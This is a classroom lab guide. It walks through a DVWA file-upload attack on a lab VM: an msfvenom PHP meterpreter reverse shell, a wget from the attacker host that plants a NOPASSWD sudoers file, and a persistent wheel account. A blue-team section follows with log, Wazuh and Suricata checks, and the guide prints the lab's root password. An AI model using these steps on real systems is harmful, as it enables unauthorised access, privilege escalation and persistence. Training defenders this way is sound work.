# Sample Scenarios

## DVWA  Upload Function

- Assumptions: `192.168.8.10` is Kali's IP and `192.168.8.149` is the Hullu VM's IP.
- In Kali: browse `http://192.168.8.149/dvwa/vulnerabilities/upload/` and see how it works
- Open `terminal 1`
    Prepare the payload
    ```sh      
    cd ~/Desktop && msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.8.10 lport=4444 -f raw -o shell_test.php
    ```
    Start `Meterpreter` listening session
    ```sh
    sudo msfconsole -x "use exploit/multi/handler; set payload php/meterpreter/reverse_tcp; set lhost 192.168.8.10; set lport 4444; exploit"
    ```
- In Firefox browser upload the `shell_test.php` in `http://192.168.8.149/dvwa/vulnerabilities/upload/` 

- Activate the uploaded `shell_test.php` by browsing this link in Firefox `http://192.168.8.149/dvwa/hackable/uploads/shell_test.php`

- In `terminal 1`, the `Meterpreter` session should be established, try `shell` then `id`

- Open `terminal 2`
    Create `sudoers` file for the account `apache`
    ```sh
    cd ~/Desktop && echo 'apache ALL=(ALL) NOPASSWD: ALL' > apache
    ```
    Start webserver in the same work path
    ```sh
    python3 -m http.server 8000
    ```

- In `terminal 1`, in the established shell `Meterpreter` session
    Check the privilege level of the current account
    ```sh
    sudo -n id
    ```
    Upload the created `sudoers` file to `Hullu` VM
    ```sh
    wget http://192.168.8.10:8000/apache -O /etc/sudoers.d/apache
    ```
    Re-check the privilege level of the current account
    ```sh
    sudo -n id
    ```
- Create persistence privilege account
    ```sh
    { echo -e "aaa\naaa" | sudo adduser -G wheel david && sudo echo '%wheel ALL=(ALL) ALL' >> /etc/sudoers; } >/dev/null 2>&1
    ```

## Blue Team Investigation

Use this section from the defender side after running the DVWA upload scenario. The commands are simple for beginner students. Run the Hullu commands as `root` on the Hullu VM:

```sh
ssh root@192.168.8.149   
```

Password:

```text           
hullu
```



If a command shows no output, that usually means the evidence was not found yet.

### Quick Evidence Capture on Hullu


Save copies of the main logs and security files before changing anything:

```sh
mkdir -p /root/hullu-ir
cp -a /var/log/apache2 /root/hullu-ir/
cp -a /var/log/messages /root/hullu-ir/
cp -a /etc/passwd /etc/group /etc/sudoers /etc/sudoers.d /root/hullu-ir/
```


### Check Uploaded Files



Look for PHP files in the DVWA upload folder:

```sh
ls -l /var/www/localhost/htdocs/dvwa/hackable/uploads
find /var/www/localhost/htdocs/dvwa/hackable/uploads -maxdepth 1 -type f -name "*.php" -print
```

Look inside uploaded files for common web shell words:   

```sh
grep -R "meterpreter" /var/www/localhost/htdocs/dvwa/hackable/uploads
grep -R "eval(" /var/www/localhost/htdocs/dvwa/hackable/uploads
grep -R "system(" /var/www/localhost/htdocs/dvwa/hackable/uploads  
grep -R "shell_exec" /var/www/localhost/htdocs/dvwa/hackable/uploads
```

### Check Apache Logs

Look for the upload page, uploaded file execution, and Kali's IP address:



```sh  
grep "POST /dvwa/vulnerabilities/upload" /var/log/apache2/access.log 
grep "/dvwa/hackable/uploads" /var/log/apache2/access.log
grep "php" /var/log/apache2/access.log
grep "192.168.8.10" /var/log/apache2/access.log
```

If students used a different payload name, search for that filename too.

### Check Network Connections and Processes  

Look for a reverse connection back to Kali on port `4444`:

```sh 
ss -tunap
ss -tunap | grep "192.168.8.10"
ss -tunap | grep "4444"
```

Look for suspicious processes:

```sh 
ps ww
ps ww | grep apache
ps ww | grep php
ps ww | grep wget
```

### Check Privilege Escalation and Persistence 

Check whether the `apache` account was given sudo access:

```sh
ls -l /etc/sudoers.d
cat /etc/sudoers.d/apache
grep "apache" /etc/sudoers /etc/sudoers.d/*
grep "NOPASSWD" /etc/sudoers /etc/sudoers.d/* 
```

Check whether the `david` account was created and added to a privileged group:

```sh                     
grep "david" /etc/passwd
grep "david" /etc/group
grep "wheel" /etc/group
grep "adduser" /var/log/messages
```

### Wazuh Investigation

Run these on the Wazuh manager or SuriZuh VM, not on Hullu:



```sh
sudo /var/ossec/bin/agent_control -l
sudo grep "192.168.8.149" /var/ossec/logs/alerts/alerts.log
sudo grep "hackable/uploads" /var/ossec/logs/alerts/alerts.log
sudo grep "sudoers" /var/ossec/logs/alerts/alerts.log
sudo grep "NOPASSWD" /var/ossec/logs/alerts/alerts.log
sudo grep "david" /var/ossec/logs/alerts/alerts.log
```

In the Wazuh Dashboard, search for simple keywords:

```text
hackable/uploads
sudoers
NOPASSWD        
david
192.168.8.10
192.168.8.149
```

### Advanced Investigation with SuriZuh

For more advanced Wazuh and Suricata investigation, use the SuriZuh project:      

https://github.com/kaledaljebur/SuriZuh

Run these on the SuriZuh VM if Suricata `eve.json` is available:

```sh      
sudo grep "192.168.8.10" /var/log/suricata/eve.json
sudo grep "192.168.8.149" /var/log/suricata/eve.json
sudo grep "4444" /var/log/suricata/eve.json
sudo grep "POST" /var/log/suricata/eve.json
sudo grep "php" /var/log/suricata/eve.json
```

Investigation questions for students:    

- Which log shows the first contact from Kali?
- Which request uploaded the file, and which request executed it?
- Which process or connection suggests command execution?
- Which file change gave `apache` sudo privileges?
- Which event confirms persistence through the `david` account?
- Did Wazuh alert on the web upload, the sudoers change, the new user, or all three?



